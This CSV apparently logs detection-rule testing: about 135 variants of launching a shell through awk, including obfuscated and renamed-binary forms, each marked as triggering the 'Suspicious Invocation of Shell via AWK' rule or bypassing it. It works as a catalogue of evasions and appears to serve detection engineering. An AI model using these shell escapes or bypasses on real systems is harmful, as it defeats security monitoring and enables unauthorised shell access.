ID,Command,Log File,Result,All Detected Rules
138,"awk 'BEGIN { system(""/bin/sh"") }'",Suspicious_Invocation_of_Shell_via_AWK_attack138.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
139,"awk 'BEGIN{ system(""/bin/sh"") }'",Suspicious_Invocation_of_Shell_via_AWK_attack139.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
140,"awk 'BEGIN {system ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack140.log,Log Error (Result Not Found),
141,"awk BEGIN{system ""/bin/sh""}",Suspicious_Invocation_of_Shell_via_AWK_attack141.log,Log Error (Result Not Found),
142,"awk BEGIN system ""/bin/sh""",Suspicious_Invocation_of_Shell_via_AWK_attack142.log,Log Error (Result Not Found),
143,"awk 'BEGIN{system ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack143.log,Log Error (Result Not Found),
144,"awk 'BEGIN system ""/bin/sh""'",Suspicious_Invocation_of_Shell_via_AWK_attack144.log,Log Error (Result Not Found),
145,"awk 'BEGIN {system ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack145.log,Log Error (Result Not Found),
146,"awk 'BEGIN system(""/bin/sh"")'",Suspicious_Invocation_of_Shell_via_AWK_attack146.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
147,"awk BEGIN system(""/bin/sh"")",Suspicious_Invocation_of_Shell_via_AWK_attack147.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
148,awk 'BEGIN system /bin/sh',Suspicious_Invocation_of_Shell_via_AWK_attack148.log,Log Error (Result Not Found),
149,awk BEGIN system /bin/sh,Suspicious_Invocation_of_Shell_via_AWK_attack149.log,Log Error (Result Not Found),
150,"awk 'BEGIN{system ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack150.log,Log Error (Result Not Found),
151,"awk BEGIN{system ""/bin/sh""}",Suspicious_Invocation_of_Shell_via_AWK_attack151.log,Log Error (Result Not Found),
152,"awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack152.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
153,"awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack153.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
154,"'BEGIN {system(""/bin/sh"")}' awk",Suspicious_Invocation_of_Shell_via_AWK_attack154.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
155,"'BEGIN {system(""/bin/sh"")}' | awk",Suspicious_Invocation_of_Shell_via_AWK_attack155.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
156,"awk -v x='BEGIN {system(""/bin/sh"")}' ""$x""",Suspicious_Invocation_of_Shell_via_AWK_attack156.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
157,"echo 'BEGIN {system(""/bin/sh"")}' | awk",Suspicious_Invocation_of_Shell_via_AWK_attack157.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
158,"awk '{if(NR==1) system(""/bin/sh"")}' <<< ""run""",Suspicious_Invocation_of_Shell_via_AWK_attack158.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
159,"awk 'BEGIN {system(""/bin/sh"")}' </dev/null",Suspicious_Invocation_of_Shell_via_AWK_attack159.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
160,"printf 'BEGIN {system(""/bin/sh"")}\n' | awk",Suspicious_Invocation_of_Shell_via_AWK_attack160.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
161,"awk 'BEGIN {system(""/bin/sh"")}'<<<""""",Suspicious_Invocation_of_Shell_via_AWK_attack161.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
162,"cat /dev/null | awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack162.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
163,"awk <<< 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack163.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
164,"true | awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack164.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
165,"awk 'BEGIN {""/bin/sh"" | getline x; close(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack165.log,Log Error (Result Not Found),
166,"awk <<<BEGIN'{system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack166.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
167,"awk<<<'BEGIN{system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack167.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
168,":|awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack168.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
169,"awk 'BEGIN {system(""/bin/sh"")}' <<EOF",Suspicious_Invocation_of_Shell_via_AWK_attack169.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
170,"bash -c 'awk ""BEGIN {system(\""/bin/sh\"")}""'",Suspicious_Invocation_of_Shell_via_AWK_attack170.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
171,"awk <<<""BEGIN {system(\""/bin/sh\"")}""",Suspicious_Invocation_of_Shell_via_AWK_attack171.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
172,"echo BEGIN {system(\""/bin/sh\"")} | awk",Suspicious_Invocation_of_Shell_via_AWK_attack172.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
173,"awk 'BEGIN {system(""/bin/sh"")}' | cat",Suspicious_Invocation_of_Shell_via_AWK_attack173.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
174,"awk 'BEGIN {system(""/bin/sh"")}' | tee /dev/null",Suspicious_Invocation_of_Shell_via_AWK_attack174.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
175,"awk 'BEGIN {system(""/bin/sh"")}' && echo",Suspicious_Invocation_of_Shell_via_AWK_attack175.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
176,"awk 'BEGIN {system(""/bin/sh"")}' &",Suspicious_Invocation_of_Shell_via_AWK_attack176.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
177,"awk 'BEGIN {system(""/bin/sh"")}' & wait",Suspicious_Invocation_of_Shell_via_AWK_attack177.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
178,"awk 'BEGIN {system(""/bin/sh"")}' && true",Suspicious_Invocation_of_Shell_via_AWK_attack178.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
179,"awk -W interactive 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack179.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
180,"env CMD='system(""/bin/sh"")' awk 'BEGIN {ENVIRON[""CMD""]}'",Suspicious_Invocation_of_Shell_via_AWK_attack180.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
181,"awk 'BEGIN {a=""/bin/sh""; system(a)}'",Suspicious_Invocation_of_Shell_via_AWK_attack181.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
182,"awk 'BEGIN {s=""sh""; system(""/bin/""s)}'",Suspicious_Invocation_of_Shell_via_AWK_attack182.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
183,"awk 'BEGIN {s=""/""; t=""bin""; u=""sh""; system(s t ""/"" u)}'",Suspicious_Invocation_of_Shell_via_AWK_attack183.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
184,"awk 'BEGIN {s=""/bin/sh""; system(s)}'",Suspicious_Invocation_of_Shell_via_AWK_attack184.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
185,"awk 'BEGIN {c=""system""; c(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack185.log,Log Error (Result Not Found),
186,"awk 'BEGIN {a=""/bin""; b=""/sh""; system(a b)}'",Suspicious_Invocation_of_Shell_via_AWK_attack186.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
187,"awk 'BEGIN {cmd=""/bin/sh""; system(cmd)}'",Suspicious_Invocation_of_Shell_via_AWK_attack187.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
188,"awk 'BEGIN {system(""/bin/sh"" """")}'",Suspicious_Invocation_of_Shell_via_AWK_attack188.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
189,"awk 'BEGIN {system(sprintf(""%s"",""/bin/sh""))}'",Suspicious_Invocation_of_Shell_via_AWK_attack189.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
190,"awk 'BEGIN {system(""/bin/sh"" ""\x00"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack190.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
191,"awk 'BEGIN {sys=system; sys(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack191.log,Log Error (Result Not Found),
192,"awk 'BEGIN {if(1) system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack192.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
193,"awk 'BEGIN {while(!system(""/bin/sh"")) break}'",Suspicious_Invocation_of_Shell_via_AWK_attack193.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
194,"awk 'BEGIN {exit system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack194.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
195,"awk 'BEGIN {for(i=0;i<1;i++) system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack195.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
196,"awk 'BEGIN {a=""/bin/"";b=""sh"";system(a b)}'",Suspicious_Invocation_of_Shell_via_AWK_attack196.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
197,"awk 'BEGIN {s=""/bin/sh"";x=system;x(s)}'",Suspicious_Invocation_of_Shell_via_AWK_attack197.log,Log Error (Result Not Found),
198,"awk 'BEGIN {system(""/bin/sh"");exit}'",Suspicious_Invocation_of_Shell_via_AWK_attack198.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
199,"awk 'BEGIN {s=""/bin/sh"";while(1) {system(s);break}}'",Suspicious_Invocation_of_Shell_via_AWK_attack199.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
200,"awk 'BEGIN {s=""/bin/sh"";system(s);}'",Suspicious_Invocation_of_Shell_via_AWK_attack200.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
201,"awk 'BEGIN {s=""/bin/sh"";if(length(s)) system(s)}'",Suspicious_Invocation_of_Shell_via_AWK_attack201.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
202,"awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack202.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
203,"awk 'BEGIN {system(""/bin/sh"") }'",Suspicious_Invocation_of_Shell_via_AWK_attack203.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
204,"awk 'BEGIN {system(""/b\x69n/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack204.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
205,"awk 'BEGIN {system(""/b\141sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack205.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
206,"awk 'BEGIN {system(""/bin"" ""/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack206.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
207,"awk 'BEGIN {system(sprintf(""%s"", ""/bin/sh""))}'",Suspicious_Invocation_of_Shell_via_AWK_attack207.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
208,"awk 'BEGIN {s=""/bin/sh""; system(s)}'",Suspicious_Invocation_of_Shell_via_AWK_attack208.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
209,"awk 'BEGIN{system(""/b\105n/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack209.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
210,"awk 'BEGIN {system(""/bi""""n/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack210.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
211,"awk 'BEGIN{cmd=""/bin/sh""; system(cmd)}'",Suspicious_Invocation_of_Shell_via_AWK_attack211.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
212,"awk 'BEGIN{system(""\x2f\x62\x69\x6e\x2f\x73\x68"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack212.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
213,"awk 'BEGIN{system(char(47) ""bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack213.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
214,"awk 'BEGIN{system(""/bin/"" ""sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack214.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
215,"awk 'BEGIN{system(""/b""""in/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack215.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
216,"awk 'BEGIN{system(""/bin/s""""h"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack216.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
217,"awk 'BEGIN{cmd=""/bin/sh""; system(cmd)}'",Suspicious_Invocation_of_Shell_via_AWK_attack217.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
218,"awk 'BEGIN{system(""/bin/sh"" """")}'",Suspicious_Invocation_of_Shell_via_AWK_attack218.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
219,"awk 'BEGIN{system(""/b"" ""in/"" ""sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack219.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
220,"awk 'BEGIN{system(""/bin"" substr(""/sh"",0))}'",Suspicious_Invocation_of_Shell_via_AWK_attack220.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
221,"awk 'BEGIN{system(""/b\x69\x6e/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack221.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
222,"awk 'BEGIN{system(""\057\142\151\156\057\163\150"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack222.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
223,"awk 'BEGIN{system(""/bin/sh""#comment)}'",Suspicious_Invocation_of_Shell_via_AWK_attack223.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
224,"awk 'BEGIN{system(""/bin/sh""/*noop*/)}'",Suspicious_Invocation_of_Shell_via_AWK_attack224.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
225,"awk 'BEGIN{system(""/bin//sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack225.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
226,"awk 'BEGIN{system(""/bi/../bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack226.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
227,"awk 'BEGIN{system(""/bin/sh"" ORS)}'",Suspicious_Invocation_of_Shell_via_AWK_attack227.log,Log Error (Result Not Found),
228,"awk 'BEGIN{system(""/bin/sh"" """")}'",Suspicious_Invocation_of_Shell_via_AWK_attack228.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
229,"awk 'BEGIN{system(""/bin"" sprintf(""%s"", ""/sh""))}'",Suspicious_Invocation_of_Shell_via_AWK_attack229.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
230,"awk 'BEGIN{cmd=""/bin/sh""; system(cmd FS """")}'",Suspicious_Invocation_of_Shell_via_AWK_attack230.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
231,"awk 'BEGIN{system(""/bi"" ""n/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack231.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
232,"awk 'BEGIN{system(""/bi""""n/""""sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack232.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
233,"awk 'BEGIN{system(""/bin/sh\x00"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack233.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
234,"awk 'BEGIN{system(""/bin/sh"" ""\n"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack234.log,Log Error (Result Not Found),
235,"awk 'BEGIN{system(""/bin/"" ""sh"" """")}'",Suspicious_Invocation_of_Shell_via_AWK_attack235.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
236,"awk 'BEGIN{system(""/bin/"" tolower(""SH""))}'",Suspicious_Invocation_of_Shell_via_AWK_attack236.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
237,"awk 'BEGIN{cmd=""/bin/sh""; print cmd |& ""/bin/sh""}'",Suspicious_Invocation_of_Shell_via_AWK_attack237.log,Log Error (Result Not Found),
238,"awk 'BEGIN{system(ENVIRON[""SHELL""])}'",Suspicious_Invocation_of_Shell_via_AWK_attack238.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
239,"awk 'BEGIN{sys=""/bin/sh""; system(sys)}'",Suspicious_Invocation_of_Shell_via_AWK_attack239.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
240,"awk 'BEGIN{a=""/bin"";b=""/sh"";system(a b)}'",Suspicious_Invocation_of_Shell_via_AWK_attack240.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
241,"awk 'BEGIN{a=47 b=98 c=105 d=110 e=47 f=115 g=104; cmd=sprintf(""%c%c%c%c%c%c%c"",a,b,c,d,e,f,g); system(cmd)}'",Suspicious_Invocation_of_Shell_via_AWK_attack241.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
242,"awk 'BEGIN{system(""/bin/sh\0"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack242.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
243,"awk 'BEGIN{system(""/bin/sh\t"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack243.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
244,"awk 'BEGIN{cmd=""/bin/sh""; if(length(cmd)) system(cmd)}'",Suspicious_Invocation_of_Shell_via_AWK_attack244.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
245,"awk 'BEGIN{if(1){system(""/bin/sh"")}}'",Suspicious_Invocation_of_Shell_via_AWK_attack245.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
246,"awk 'BEGIN{(system)(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack246.log,Log Error (Result Not Found),
247,"awk 'BEGIN{system(""/b"" ""in"" ""/"" ""sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack247.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
248,"awk 'BEGIN{system(""/bin"" ""/"" ""sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack248.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
249,"awk 'BEGIN{cmd=""/bin/sh""; system(cmd """")}'",Suspicious_Invocation_of_Shell_via_AWK_attack249.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
250,"awk 'BEGIN{system(""/bin/sh\072"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack250.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
251,"awk 'BEGIN{system(""/bin/sh\012"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack251.log,Log Error (Result Not Found),
252,"cp $(which awk) /tmp/t; /tmp/t 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack252.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Shell Execution Of Process Located In Tmp Directory | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
253,"cp /usr/bin/awk /tmp/x; /tmp/x 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack253.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Shell Execution Of Process Located In Tmp Directory | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
254,"cp /bin/awk ./a; ./a 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack254.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
255,"install /usr/bin/awk /tmp/b; /tmp/b 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack255.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Shell Execution Of Process Located In Tmp Directory | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
256,"ln /bin/awk /tmp/h; /tmp/h 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack256.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux | Execution Of Script Located In Potentially Suspicious Directory
257,"ln -s $(which awk) ./j; ./j 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack257.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Syslog Clearing or Removal Via System Utilities | Suspicious Invocation of Shell via AWK - Linux
258,"cp $(command -v awk) ./q; ./q 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack258.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
259,"cp $(which gawk) /tmp/a1; /tmp/a1 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack259.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
260,"cp /usr/bin/gawk /tmp/a2; /tmp/a2 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack260.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
261,"cp /bin/gawk ./a3; ./a3 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack261.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
262,"install /usr/bin/gawk /tmp/a4; /tmp/a4 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack262.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
263,"ln /bin/gawk /tmp/a5; /tmp/a5 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack263.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
264,"cp $(command -v gawk) ./a6; ./a6 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack264.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
265,"cp $(which mawk) /tmp/m1; /tmp/m1 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack265.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Shell Execution Of Process Located In Tmp Directory | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
266,"cp /usr/bin/mawk /tmp/m2; /tmp/m2 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack266.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Shell Execution Of Process Located In Tmp Directory | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
267,"cp /bin/mawk ./m3; ./m3 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack267.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
268,"install /usr/bin/mawk /tmp/m4; /tmp/m4 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack268.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Shell Execution Of Process Located In Tmp Directory | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
269,"ln /bin/mawk /tmp/m5; /tmp/m5 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack269.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Shell Execution Of Process Located In Tmp Directory | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
270,"cp $(command -v mawk) ./m6; ./m6 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack270.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
271,"cp $(which nawk) /tmp/n1; /tmp/n1 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack271.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Shell Execution Of Process Located In Tmp Directory | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
272,"cp /usr/bin/nawk /tmp/n2; /tmp/n2 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack272.log,Bypass Target Rule,Potentially Suspicious Execution From Tmp Folder | Shell Execution Of Process Located In Tmp Directory | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
